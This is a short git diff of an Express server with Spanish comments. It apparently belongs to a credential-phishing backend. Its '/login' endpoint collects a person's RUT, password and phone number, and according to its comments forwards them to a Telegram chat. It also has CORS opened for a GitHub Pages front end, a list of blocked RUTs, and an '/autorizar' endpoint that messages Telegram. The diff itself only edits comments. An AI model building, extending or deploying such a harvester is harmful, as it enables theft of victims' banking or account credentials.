@@ -7,7 +7,7 @@ const app = express();
 // Habilitar CORS para permitir llamadas desde GitHub Pages
 app.use(cors());
 
-// Middleware para parsear JSON
+// Middleware para parsear JSON y formularios
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
@@ -16,9 +16,9 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 
 // Lista de RUTs bloqueados
-const bloqueados = ["250624344", "25062434-4", "25.062.434-4"]; 
+const bloqueados = ["250624344", "25062434-4", "25.062.434-4"];
 
-// Endpoint de login (actual, con Telegram)
+// Endpoint de login (envía datos a Telegram)
 app.post("/login", async (req, res) => {
   const { rut, passwd, telefono } = req.body;
 
@@ -68,7 +68,7 @@ app.post("/proxy-login", async (req, res) => {
   }
 });
 
-// Endpoint de autorización (actual)
+// Endpoint de autorización (envía mensaje a Telegram)
 app.post("/autorizar", async (req, res) => {
   const mensaje = "AUTORIZAR!!!";
 
